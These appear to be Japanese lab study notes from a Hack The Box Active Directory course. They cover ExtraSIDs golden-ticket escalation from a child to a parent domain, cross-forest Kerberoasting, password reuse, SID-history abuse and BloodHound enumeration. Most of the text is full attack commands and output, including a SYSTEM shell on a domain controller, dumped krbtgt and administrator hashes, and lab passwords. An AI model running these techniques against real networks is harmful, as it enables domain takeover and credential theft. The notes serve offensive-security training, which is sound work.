	- Domain SIDのみを抽出している図
```shell-session
snowyowl644@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240  | grep "Domain SID"
```
出力で見るポイント
- ドメインのSID（例：S-1-5-21-2806153819-209893948-922872689）がわかれば、任意のRIDを加えることで、偽のユーザーSIDを作成

**親ドメインのSIDとEnterprise AdminsのRIDを特定する**
- 親ドメインのドメインコントローラ（この例では DC01、IPアドレスは 172.16.5.5）を対象に同じコマンドを再実行し、Enterprise AdminsグループのSIDを取得する
```shell-session
snowyowl644@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```
注目すべきポイント
- Enterprise AdminsグループのSIDは、ドメインSIDに -519 を付けたもの：S-1-5-21-3842939050-3880317879-2865463114-519
- これをゴールデンチケットに「追加の権限」として付与することで、親ドメインへのアクセスを可能にする

**ticketer.pyを使ってゴールデンチケットを生成**
- ticketer.py を使って実際にチケットを偽造する
- このチケットは、子ドメインと親ドメイン両方へのアクセスに使えるようになる
```shell-session
snowyowl644@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
- このコマンドは「hacker」というユーザーに、親ドメインのEnterprise Adminsグループ相当の権限を持たせた偽チケットを作る\
- チケットは hacker.ccache というファイルとして保存される。これはKerberosの認証キャッシュ（ccache）

**環境変数でKerberosにこのチケットを使わせる**
- この偽チケットを使って認証させるために、環境変数 KRB5CCNAME を設定する
```shell-session
snowyowl644@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
```
- Kerberosを使うツール（例：smbclient, wmiexec.py, など）は、この偽チケットを使って行動できるようになる

**親ドメインへの認証確認：Impacket版 PsExec を使ったSYSTEMシェルの取得**
- 偽造したゴールデンチケットを使って、親ドメインのドメインコントローラ（DC）にアクセスできるかを確認
- Impacket の psexec.py を使う
	- 成功すれば、対象DC上で SYSTEM 権限のシェルが取得できる
```shell-session
snowyowl644@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### raiseChild.py
- 子→親ドメイン昇格の自動化ツール
- これを使えば一連の手動操作を自動化できる
- このツールは、指定した子ドメインの管理者資格情報を使って、親ドメインの管理者資格を取得する一連の流れを自動でやってくれる
	- まずは、このツールを使って、行ってみて、できなければ、上の方法を試す

ワークフロー概要
 1) 子ドメインの管理者資格情報を入力（例：domain/username[:password]）
 2) （任意）生成されたチケットの保存パスを指定
 3) （任意）ターゲットユーザーのRIDを指定（デフォルトはAdministrator）
 4) （任意）PsExecを使う対象ホストを指定（デフォルトはEnterprise Admin権限）

 処理の流れ
 1) 子ドメインのDCを特定
 2) フォレストのFQDNを取得
 3) Enterprise AdminsグループのSIDを取得
 4) 子ドメインのkrbtgt資格情報を取得
 5) ExtraSIDsにEnterprise Admin SIDを含めたゴールデンチケットを作成（有効期限10年）
 6) そのチケットで親ドメインにログインしてAdministrator情報を取得
 7) 指定があればチケットをccache形式で保存
 8) 指定があればPsExecで親ドメインのDCにログイン
```shell-session
snowyowl644@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file BnEGssCE.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service UVNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
- クライアントに「autopwnスクリプトで壊れました…」とは絶対に言えないから、実際にペネトレでは使わない方がいい

## クロスフォレストKerberoasting
### Windows
- どんな攻撃？
	- 複数のActive Directoryドメイン間の信頼関係（トラスト）を悪用するKerberoasting攻撃
	- 自分が所属するドメインでなく、**別ドメインの管理者アカウントのハッシュを取得して解析**する
- 攻撃が可能な条件
	- トラストの種類が「双方向」または「受信側」の信頼である
	- 対象ドメインにSPNが設定されたアカウントが存在する
- 攻撃の流れ
	- PowerViewで、**SPN付きアカウントを列挙**
	- そのアカウントが**管理者グループに所属**しているか確認
	- Rubeusで、**Kerberosチケット（TGS）を取得**
	- 得られたハッシュを**Hashcatで解析**
- なぜ危険？
	- 元のドメインでPrivilege Escalationできなくても、**別ドメインの管理者権限を奪える**
	- トラストがあるだけで、**他のドメインの内部情報を引き出せる**
- 防御方法（簡易版）
	- SPNが設定されたアカウントに**強力なパスワード**を設定
	- **RC4ではなくAES暗号を優先**する設定にする（可能なら）
	- 管理者アカウントには**最小限のSPNだけ設定**

**SPN付きアカウントの列挙（Get-DomainUser使用）**
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```
- mssqlsvc というアカウントにSPNが設定されており、これはKerberoasting攻撃の対象となる
- このアカウントがターゲットドメインの「Domain Admins」グループのメンバーであるか確認

**mssqlsvcアカウントの詳細確認**
```powershell-session
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```
- mssqlsvc は「Domain Admins」グループのメンバー
	- このアカウントのチケットを取得しハッシュを解析できれば、FREIGHTLOGISTICSドメインの完全な管理者権限が得られる

**Rubeusを使ったKerberoasting攻撃の実行（/domainフラグ使用)**
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```
- このハッシュをHashcatにかけて解析できれば、たった一度の標準的な攻撃と、双方向フォレスト信頼関係の認証設定の甘さを利用することで、2つのドメインの支配権を一気に手に入れることができる

### Linux
**GetUserSPNs.py の使用**
- 攻撃者は INLANEFREIGHT.LOCAL ドメインにいるが、FREIGHTLOGISTICS.LOCAL を標的にしている
```shell-session
snowyowl644@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```

**-request フラグを使って TGS チケットを取得**
```shell-session
snowyowl644@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```
- このハッシュを割って、パスワードを割り出せれば、FREIGHTLOGISTICS.LOCAL ドメインで Domain Admin として認証可能
- 現行ドメインに同一のアカウントが存在するか、パスワードが再利用されていないかもチェックすべき
- 現行ドメインで手詰まりなら、**このハッシュで他のサービスアカウントにパスワードスプレー攻撃を試す価値もある**

## 管理者パスワードの使い回し

 管理者アカウントのパスワード再利用
- 同じ管理者が複数のドメインを管理していると、パスワードの再利用が発生しがち
	- ドメインAで奪取したパスワードで、ドメインBにもログインできる可能性あり
	- 「名前は違うけどパスワードは同じ」パターンもあるので、試してみる価値あり


 実際にログオンして確認
- `Enter-PSSession` で別ドメインのドメインコントローラにアクセスして、whoamiで確認
	- フォレスト信頼が正しく設定されていれば、別フォレストの管理者権限を得られる

攻撃者としてのチェックポイント
- サービスアカウントの存在 → Kerberoasting可能か？
- ドメイン間の信頼関係 → 相互信頼があるか？
- 管理者パスワードの使い回し → 同名 or 類似名アカウントの確認
- 外部ドメインメンバー → PowerViewでグループ構成を確認
- SID History → SIDの追跡と履歴チェック

**PowerViewを使って異なるドメインのメンバーを調査**
```powershell-session
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL
```

SIDを名前に変換
```powershell-session
PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```
- FREIGHTLOGISTICS.LOCAL ドメインの「Administrators」グループに、別フォレスト INLANEFREIGHT.LOCAL の「administrator」アカウントが含まれている

**実際に接続して権限を確認**
```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```
別ドメイン（INLANEFREIGHT.LOCAL）の管理者アカウントで、FREIGHTLOGISTICS.LOCALの**ドメインコントローラに認証成功**している

##  **グループメンバーシップの悪用**
SID履歴の悪用（Cross Forest編）
- どんな攻撃？
	- ユーザーが別フォレストに移動したとき、SID履歴に古いSID（管理者など）を持っていると、古いフォレストでの権限を維持したままになる
- なぜ危ない？
	- 移行後のアカウントが、移行前のフォレストの管理者として振る舞える
	- つまり、別のフォレストにいても、元のフォレストのリソースに「管理者」としてアクセスできてしまう
- どうしてそうなる？
	- SIDフィルタリングという仕組みが無効だと、信頼関係をまたいで「余分なSID」もトークンに含まれてしまう
- 攻撃者はどこを狙う？
	- SID履歴に管理者SIDが残っているユーザー
	- フォレスト間の信頼関係にSIDフィルタリングが無効な部分
- 対策は？
	- SIDフィルタリングを有効にする（"SID filtering" or "Quarantine" を使う）
	- ユーザー移行時にSID履歴を適切に管理する（不要なSIDを消す）

図の説明（jjonesのSID履歴悪用シナリオ）
- 2つのフォレストが登場
	- INLANEFREIGHT.LOCAL（元のフォレスト / Forest A）
	- CORP.LOCAL（移行先のフォレスト / Forest B）
- ユーザーの流れ
	- `jjones` ユーザーが INLANEFREIGHT.LOCAL から CORP.LOCAL に「移行」される
- ポイント
	- SIDフィルタリングが無効だと、`jjones` のSID履歴に Forest A のSIDが残ったままになる
	- この状態でCORP.LOCALにいる `jjones` が、Forest Aにアクセスすると…
		- **昔のSIDに基づいて「管理者」として扱われてしまう**
		- 結果、Forest A内のサーバーや共有リソースに、管理者レベルでアクセスできる
- 攻撃者視点で言えば
	- CORP.LOCALにいる `jjones` を乗っ取るだけで、Forest Aのリソースも管理できてしまう
![](https://i.imgur.com/Y8gQPHp.png)



**BloodHound-python で他ドメインのグループメンバーを調査する**
- **双方向のフォレスト信頼があると、Domain Local グループには他フォレストのユーザーも参加可能**なため、こうしたケースは珍しくない

**/etc/resolv.conf に DNS 情報を追加**
```shell-session
snowyowl644@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

**BloodHound-python を INLANEFREIGHT.LOCAL に対して実行**
- 注目点: -dc にはドメインコントローラ名を指定（FQDNではなくホスト名で）
```shell-session
snowyowl644@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
```

JSONファイルが大量に出るので、以下のように ZIP 圧縮して BloodHound GUI にアップロードできる
```shell-session
snowyowl644@htb[/htb]$ zip -r ilfreight_bh.zip *.json
```

**/etc/resolv.conf に FREIGHTLOGISTICS.LOCAL の情報も追加**
```shell-session
snowyowl644@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

**BloodHound-python を FREIGHTLOGISTICS.LOCAL に対して実行**
```shell-session
snowyowl644@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```



信頼関係を悪用する上でのまとめ
このように、ドメイン信頼を利用したアクセス権の横展開や、別経路からの権限昇格は多くのシナリオで発生し得る。
- たとえば、子ドメインの Domain Admin を乗っ取れば、ExtraSIDs 攻撃を通じて親ドメインを掌握できる。
- パスワード再利用を見つけたら、それは即「成功」につながるチャンス。
- フォレスト信頼を悪用した攻撃は、複雑である分だけ、攻撃者にとって大きな利益をもたらす。
